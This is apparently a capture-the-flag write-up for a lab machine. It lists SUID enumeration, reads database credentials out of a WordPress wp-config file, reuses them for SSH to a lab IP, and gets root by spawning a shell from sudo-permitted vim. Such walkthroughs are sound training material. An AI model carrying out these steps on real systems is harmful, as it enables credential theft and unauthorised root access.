### started by finding suid bit files
```bash
find / -user root -perm /4000 2>/dev/null  
```

### searching around /var/www/html, I find wp-config
```
/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

```

### we find c0ldd's credentials
user: c0ldd
password: cybersecurity

### use these credentials for ssh on port  4512
```
ssh c0ldd@10.10.226.162 -p 4512
```

### as c0ldd, i run *sudo -l*
(root) /usr/bin/vim
vim can be run as root
we can spawn a shell from within vim
```bash
sudo /usr/bin/vim
:set shell=/bin/sh
:shell
```

### root acquired